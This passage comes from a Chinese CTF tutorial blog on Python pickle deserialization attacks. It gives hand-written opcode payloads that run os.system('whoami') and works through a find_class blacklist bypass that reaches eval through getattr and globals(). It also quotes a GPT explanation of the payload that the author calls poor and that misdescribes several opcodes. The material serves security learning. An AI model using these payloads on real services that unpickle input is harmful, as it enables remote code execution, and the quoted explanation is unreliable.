<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-string">b&#x27;&#x27;&#x27;cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">(S&#x27;whoami&#x27;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
<p><code>i</code> ：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
<p><code>o</code> ：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-string">b&#x27;&#x27;&#x27;(cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">S&#x27;whoami&#x27;</span><br><span class="hljs-string">o.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
<h4 id="实例化对象"><a href="#实例化对象" class="headerlink" title="实例化对象"></a>实例化对象</h4>
<p>实例化对象是一种特殊的函数执行，这里简单的使用 <code>R</code> 构造一下，其他方式类似：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        self.name = name<br>        self.age = age<br><br>poc = <span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">Student</span><br><span class="hljs-string">(S&#x27;hybcx&#x27;</span><br><span class="hljs-string">S&#x27;19&#x27;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br><br>a = pickle.loads(poc)<br><span class="hljs-built_in">print</span>(a.name, a.age)<br></code></pre></td></tr></table></figure>
<p>到这里已经基本熟练对于该手工构造payload了，也能对每条语句看懂，不过有点疑惑的就是最前面的b，对于上述表格的解释，我还是有点懵懂，只是感觉b只是一个使后续的字符串成为一个对象的作用吧，可能。</p>
<h4 id="pker的使用（推荐）"><a href="#pker的使用（推荐）" class="headerlink" title="pker的使用（推荐）"></a>pker的使用（推荐）</h4>
<ul>
<li>pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在<a target="_blank" rel="noopener" href="https://github.com/eddieivan01/pker%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E3%80%82%E8%A7%A3%E6%9E%90%E5%99%A8%E7%9A%84%E5%8E%9F%E7%90%86%E8%A7%81%E4%BD%9C%E8%80%85%E7%9A%84paper%EF%BC%9A">https://github.com/eddieivan01/pker下载源码。解析器的原理见作者的paper：</a><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7012">通过AST来构造Pickle opcode</a>。</li>
<li>使用pker，我们可以更方便地编写pickle opcode，pker的使用方法将在下文中详细介绍。需要注意的是，建议在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker。</li>
</ul>
<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4>
<p>pickle序列化的结果与操作系统有关，使用windows构建的payload可能不能在linux上运行。比如：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># linux(注意posix):</span><br><span class="hljs-string">b&#x27;cposix\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.&#x27;</span><br><br><span class="hljs-comment"># windows(注意nt):</span><br><span class="hljs-string">b&#x27;cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.&#x27;</span><br></code></pre></td></tr></table></figure>
<h3 id="5-4-3-CTF实战"><a href="#5-4-3-CTF实战" class="headerlink" title="5-4-3-CTF实战"></a>5.4.3 CTF实战</h3>
<h4 id="做题之前：了解pickle-Unpickler-find-class"><a href="#做题之前：了解pickle-Unpickler-find-class" class="headerlink" title="做题之前：了解pickle-Unpickler-find-class"></a>做题之前：了解<code>pickle.Unpickler.find_class()</code></h4>
<p>由于官方针对pickle的安全问题的建议是修改<code>find_class()</code>，引入白名单的方式来解决，很多CTF题都是针对该函数进行，所以搞清楚如</p>
<p>何绕过该函数很重要。</p>
<p>什么时候会调用<code>find_class()</code>：</p>
<ol>
<li>从opcode角度看，当出现<code>c</code>、<code>i</code>、<code>b'\x93'</code>时，会调用，所以只要在这三个opcode直接引入模块时没有违反规则即可。</li>
<li>从python代码来看，<code>find_class()</code>只会在解析opcode时调用一次，所以只要绕过opcode执行过程，<code>find_class()</code>就不会再调用，也就是说<code>find_class()</code>只需要调用过一次，通过之后再产生的函数在黑名单中也不会拦截，所以可以通过<code>__import__</code>绕过一些黑名单。</li>
</ol>
<p>下面先看两个例子：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs py">safe_builtins = &#123;<span class="hljs-string">&#x27;range&#x27;</span>,<span class="hljs-string">&#x27;complex&#x27;</span>,<span class="hljs-string">&#x27;set&#x27;</span>,<span class="hljs-string">&#x27;frozenset&#x27;</span>,<span class="hljs-string">&#x27;slice&#x27;</span>,&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-comment"># Only allow safe classes from builtins.</span><br>        <span class="hljs-keyword">if</span> module == <span class="hljs-string">&quot;builtins&quot;</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">in</span> safe_builtins:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(builtins, name)<br>        <span class="hljs-comment"># Forbid everything else.</span><br>        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %(module, name))<br></code></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-keyword">if</span> module == <span class="hljs-string">&#x27;__main__&#x27;</span>: <span class="hljs-comment"># 只允许__main__模块</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(sys.modules[<span class="hljs-string">&#x27;__main__&#x27;</span>], name)<br>        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))<br></code></pre></td></tr></table></figure>
<ul>
<li>第一个例子是官方文档中的例子，使用白名单限制了能够调用的模块为<code>&#123;'range','complex','set','frozenset','slice',&#125;</code>。</li>
<li>第二个例子是高校战疫网络安全分享赛·webtmp中的过滤方法，只允许<code>__main__</code>模块。虽然看起来很安全，但是被引入主程序的模块都可以通过<code>__main__</code>调用修改，所以造成了变量覆盖。</li>
</ul>
<p>由这两个例子我们了解到，对于开发者而言，使用白名单谨慎列出安全的模块则是规避安全问题的方法；而如何绕过<code>find_class</code>函数内</p>
<p>的限制就是pickle反序列化解题的关键。</p>
<p>此外，CTF中的考察点往往还会结合python的基础知识（往往是内置的模块、属性、函数）进行，考察对白名单模块的熟悉程度，所以做</p>
<p>题的时候可以先把白名单模块的文档看一看:)</p>
<h5 id="绕过builtins"><a href="#绕过builtins" class="headerlink" title="绕过builtins"></a>绕过builtins</h5>
<p>在一些例子中，我们常常会见到<code>module==&quot;builtins&quot;</code>这一限制，比如官方文档中的例子，只允许我们导入<code>builtins</code>这一模块</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">if</span> module == <span class="hljs-string">&quot;builtins&quot;</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">in</span> safe_builtins:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(builtins, name)<br></code></pre></td></tr></table></figure>
<p>那么什么是<code>builtins</code>模块呢？</p>
<p>当我们启动Python之后，即使没有创建任何的变量或者函数，还是会有许多函数可以使用，如</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">&gt;&gt;&gt;<span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)<br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p>上述这类函数被我们称为”内置函数”，这其实就是builtins模块的功劳，这些内置函数都是包含在builtins模块内的。而Python解释器在启动时已经自动帮我们导入了builtins模块，所以我们自然就可以使用这些内置函数了。</p>
<p>我们可以通过<code>for i in sys.modules['builtins'].__dict__:print(i)</code>来查看该模块中包含的所有模块函数等，大致如下</p>
<p class='item-img' data-src='image-20231116211655339.png'><img src="image-20231116211655339.png" alt="image-20231116211655339"></p>
<h4 id="Code-Breaking-picklecode"><a href="#Code-Breaking-picklecode" class="headerlink" title="Code-Breaking-picklecode"></a>Code-Breaking:picklecode</h4>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> builtins<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br>    blacklist = &#123;<span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;execfile&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;input&#x27;</span>, <span class="hljs-string">&#x27;__import__&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>&#125;<br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-comment"># Only allow safe classes from builtins.</span><br>        <span class="hljs-keyword">if</span> module == <span class="hljs-string">&quot;builtins&quot;</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.blacklist:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(builtins, name)<br>        <span class="hljs-comment"># Forbid everything else.</span><br>        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %<br>                                     (module, name))<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">restricted_loads</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()<br></code></pre></td></tr></table></figure>
<p>题目将pickle能够引入的模块限定为<code>builtins</code>，并且设置了子模块黑名单：<code>&#123;'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'&#125;</code>，于是我们能够<strong>直接</strong>利用的模块有：</p>
<ul>
<li><code>builtins</code>模块中，黑名单外的子模块。</li>
<li>已经<code>import</code>的模块：<code>io</code>、<code>builtins</code>（需要先利用<code>builtins</code>模块中的函数）</li>
</ul>
<p>黑名单中没有<code>getattr</code>，所以可以通过<code>getattr</code>获取<code>io</code>或<code>builtins</code>的子模块以及子模块的子模块:)，而<code>builtins</code>里有<code>eval、exec</code>等危险函数，即使在黑名单中，也可以通过<code>getattr</code>获得。pickle不能直接获取<code>builtins</code>一级模块，但可以通过<code>builtins.globals()</code>获得<code>builtins</code>；这样就可以执行任意代码了。</p>
<p>我们可以借鉴Python沙箱逃逸的思路，获取我们想要的函数。代码没有禁用<code>getattr()</code>函数，<code>getattr</code>可以获取对象的属性值。因此我们可以通过<code>builtins.getattr(builtins,'eval')</code>的形式来获取eval函数</p>
<p class='item-img' data-src='image-20231116212103967.png'><img src="image-20231116212103967.png" alt="image-20231116212103967"></p>
<p>接下来我们得构造出一个<code>builtins</code>模块来传给<code>getattr</code>的第一个参数，我们可以使用<code>builtins.globals()</code>函数获取builtins模块包含的内容</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> builtins<br><span class="hljs-built_in">print</span>(builtins.<span class="hljs-built_in">globals</span>())<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231116212125197.png'><img src="image-20231116212125197.png" alt="image-20231116212125197"></p>
<p>可见builtins模块中仍包含builtins模块。由于返回的结果是个字典，所以我们还需要获取get()函数</p>
<p class='item-img' data-src='image-20231116212132995.png'><img src="image-20231116212132995.png" alt="image-20231116212132995"></p>
<p>最终构造的payload为<code>builtins.getattr(builtins.getattr(builtins.dict,'get')(builtins.golbals(),'builtins'),'eval')(command)</code></p>
<p>思路有了，下面就是手写opcode了。首先获取get函数</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br> <br>opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">dict</span><br><span class="hljs-string">S&#x27;get&#x27;</span><br><span class="hljs-string">tR.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>pickletools.dis(opcode)<br><span class="hljs-built_in">print</span>(pickle.loads(opcode))<br> <br><span class="hljs-comment">###结果如下</span><br>    <span class="hljs-number">0</span>: c    GLOBAL     <span class="hljs-string">&#x27;builtins getattr&#x27;</span><br>   <span class="hljs-number">18</span>: (    MARK<br>   <span class="hljs-number">19</span>: c        GLOBAL     <span class="hljs-string">&#x27;builtins dict&#x27;</span><br>   <span class="hljs-number">34</span>: S        STRING     <span class="hljs-string">&#x27;get&#x27;</span><br>   <span class="hljs-number">41</span>: t        TUPLE      (MARK at <span class="hljs-number">18</span>)<br>   <span class="hljs-number">42</span>: R    REDUCE<br>   <span class="hljs-number">43</span>: .    STOP<br>highest protocol among opcodes = <span class="hljs-number">0</span><br>&lt;method <span class="hljs-string">&#x27;get&#x27;</span> of <span class="hljs-string">&#x27;dict&#x27;</span> objects&gt;<br></code></pre></td></tr></table></figure>
<p>然后获取globals()字典</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br> <br>opcode2=<span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">globals</span><br><span class="hljs-string">)R.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br> <br>pickletools.dis(opcode2)<br><span class="hljs-built_in">print</span>(pickle.loads(opcode2))<br> <br><span class="hljs-comment">###结果如下</span><br>    <span class="hljs-number">0</span>: c    GLOBAL     <span class="hljs-string">&#x27;builtins globals&#x27;</span><br>   <span class="hljs-number">18</span>: )    EMPTY_TUPLE<br>   <span class="hljs-number">19</span>: R    REDUCE<br>   <span class="hljs-number">20</span>: .    STOP<br>highest protocol among opcodes = <span class="hljs-number">1</span><br>&#123;<span class="hljs-string">&#x27;__name__&#x27;</span>: <span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;__doc__&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;__package__&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;__loader__&#x27;</span>: &lt;_frozen_importlib_external.SourceFileLoader <span class="hljs-built_in">object</span> at <span class="hljs-number">0x000001EF06A308B0</span>&gt;, <span class="hljs-string">&#x27;__spec__&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;__annotations__&#x27;</span>: &#123;&#125;, <span class="hljs-string">&#x27;__builtins__&#x27;</span>: &lt;module <span class="hljs-string">&#x27;builtins&#x27;</span> (built-<span class="hljs-keyword">in</span>)&gt;, <span class="hljs-string">&#x27;__file__&#x27;</span>: <span class="hljs-string">&#x27;C:/Users/34946/Desktop/安全学习/Pickle_Learning/Pickle_builtins1.py&#x27;</span>, <span class="hljs-string">&#x27;__cached__&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;pickle&#x27;</span>: &lt;module <span class="hljs-string">&#x27;pickle&#x27;</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;C:\\Users\\34946\\AppData\\Local\\Programs\\Python\\Python38\\lib\\pickle.py&#x27;</span>&gt;, <span class="hljs-string">&#x27;pickletools&#x27;</span>: &lt;module <span class="hljs-string">&#x27;pickletools&#x27;</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;C:\\Users\\34946\\AppData\\Local\\Programs\\Python\\Python38\\lib\\pickletools.py&#x27;</span>&gt;, <span class="hljs-string">&#x27;opcode1&#x27;</span>: <span class="hljs-string">b&quot;cbuiltins\ngetattr\n(cbuiltins\ndict\nS&#x27;get&#x27;\ntR.\n&quot;</span>, <span class="hljs-string">&#x27;opcode2&#x27;</span>: <span class="hljs-string">b&#x27;cbuiltins\nglobals\n)R.\n&#x27;</span>&#125;<br></code></pre></td></tr></table></figure>
<p>现在我们有了get()，有了globals()字典，把他们组合起来我们就能够获取builtins模块了</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br> <br>opcode3=<span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">dict</span><br><span class="hljs-string">S&#x27;get&#x27;</span><br><span class="hljs-string">tR(cbuiltins</span><br><span class="hljs-string">globals</span><br><span class="hljs-string">)RS&#x27;__builtins__&#x27;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br> <br><span class="hljs-comment">#以上opcode相当于执行了builtins.getattr(builtins.dict,&#x27;get&#x27;)(builtins.globals(),&#x27;builtins&#x27;)</span><br> <br>pickletools.dis(opcode3)<br><span class="hljs-built_in">print</span>(pickle.loads(opcode3))<br> <br><span class="hljs-comment">###结果如下</span><br>    <span class="hljs-number">0</span>: c    GLOBAL     <span class="hljs-string">&#x27;builtins getattr&#x27;</span><br>   <span class="hljs-number">18</span>: (    MARK<br>   <span class="hljs-number">19</span>: c        GLOBAL     <span class="hljs-string">&#x27;builtins dict&#x27;</span><br>   <span class="hljs-number">34</span>: S        STRING     <span class="hljs-string">&#x27;get&#x27;</span><br>   <span class="hljs-number">41</span>: t        TUPLE      (MARK at <span class="hljs-number">18</span>)<br>   <span class="hljs-number">42</span>: R    REDUCE<br>   <span class="hljs-number">43</span>: (    MARK<br>   <span class="hljs-number">44</span>: c        GLOBAL     <span class="hljs-string">&#x27;builtins globals&#x27;</span><br>   <span class="hljs-number">62</span>: (        MARK<br>   <span class="hljs-number">63</span>: t            TUPLE      (MARK at <span class="hljs-number">62</span>)<br>   <span class="hljs-number">64</span>: R        REDUCE<br>   <span class="hljs-number">65</span>: S        STRING     <span class="hljs-string">&#x27;builtins&#x27;</span><br>   <span class="hljs-number">77</span>: t        TUPLE      (MARK at <span class="hljs-number">43</span>)<br>   <span class="hljs-number">78</span>: R    REDUCE<br>   <span class="hljs-number">79</span>: .    STOP<br>highest protocol among opcodes = <span class="hljs-number">0</span><br>&lt;module <span class="hljs-string">&#x27;builtins&#x27;</span> (built-<span class="hljs-keyword">in</span>)&gt;<br></code></pre></td></tr></table></figure>
<p>最后我们再调用获取到的builtins的eval函数即可</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br> <br>opcode4=<span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">dict</span><br><span class="hljs-string">S&#x27;get&#x27;</span><br><span class="hljs-string">tR(cbuiltins</span><br><span class="hljs-string">globals</span><br><span class="hljs-string">)RS&#x27;__builtins__&#x27;</span><br><span class="hljs-string">tRS&#x27;eval&#x27;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br> <br><span class="hljs-built_in">print</span>(pickle.loads(opcode4))<br> <br><span class="hljs-comment">###</span><br>&lt;built-<span class="hljs-keyword">in</span> function <span class="hljs-built_in">eval</span>&gt;<br></code></pre></td></tr></table></figure>
<p>最终payload为：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">p0</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">dict</span><br><span class="hljs-string">S&#x27;get&#x27;</span><br><span class="hljs-string">tRp1</span><br><span class="hljs-string">cbuiltins</span><br><span class="hljs-string">globals</span><br><span class="hljs-string">)Rp2</span><br><span class="hljs-string">00g1</span><br><span class="hljs-string">(g2</span><br><span class="hljs-string">S&#x27;builtins&#x27;</span><br><span class="hljs-string">tRp3</span><br><span class="hljs-string">0g0</span><br><span class="hljs-string">(g3</span><br><span class="hljs-string">S&#x27;eval&#x27;</span><br><span class="hljs-string">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span><br><span class="hljs-string">tR.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
<p>这里附上GPT的分析，但解释的不太好。。。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs py">让我们逐行解释上述 Pickle 数据块中的代码，并说明每行之间的共同作用：<br><br><span class="hljs-number">1.</span> `cbuiltins`: 这个操作码表示使用 `builtins` 模块。<br><br><span class="hljs-number">2.</span> `<span class="hljs-built_in">getattr</span>`: 这个操作码表示调用 `builtins` 模块的 `<span class="hljs-built_in">getattr</span>` 函数。<br><br><span class="hljs-number">3.</span> `p0`: 这个操作码表示将接下来的值压入堆栈顶，标记为位置 `<span class="hljs-number">0</span>`。<br><br><span class="hljs-number">4.</span> `(cbuiltins`: 这个操作码表示创建一个元组，包含了 `builtins` 模块。<br><br>共同作用：`cbuiltins` 和 `<span class="hljs-built_in">getattr</span>` 一起表示使用 `builtins` 模块的 `<span class="hljs-built_in">getattr</span>` 函数。<br><br>结果：此时堆栈顶部包含了一个表示 `<span class="hljs-built_in">getattr</span>` 函数的对象。<br><br><span class="hljs-number">5.</span> `<span class="hljs-built_in">dict</span>`: 这个操作码表示创建一个空字典。<br><br><span class="hljs-number">6.</span> `S<span class="hljs-string">&#x27;get&#x27;</span>`: 这个操作码表示将字符串 `<span class="hljs-string">&#x27;get&#x27;</span>` 压入堆栈。<br><br><span class="hljs-number">7.</span> `tRp1`: 这个操作码表示调用 `<span class="hljs-built_in">dict</span>` 构造函数，将键值对加入字典。这里的键是字符串 `<span class="hljs-string">&#x27;get&#x27;</span>`。<br><br>共同作用：`<span class="hljs-built_in">dict</span>`、`S<span class="hljs-string">&#x27;get&#x27;</span>` 和 `tRp1` 一起表示创建一个字典，其中包含了一个键值对（键为 `<span class="hljs-string">&#x27;get&#x27;</span>`）。<br><br>结果：此时堆栈顶部包含了一个字典。<br><br><span class="hljs-number">8.</span> `cbuiltins`: 这个操作码表示使用 `builtins` 模块。<br><br><span class="hljs-number">9.</span> `<span class="hljs-built_in">globals</span>`: 这个操作码表示调用 `builtins` 模块的 `<span class="hljs-built_in">globals</span>` 函数。<br><br><span class="hljs-number">10.</span> `)Rp2`: 这个操作码表示调用 `<span class="hljs-built_in">dict</span>` 构造函数，将键值对加入字典。这里的键是字符串 `<span 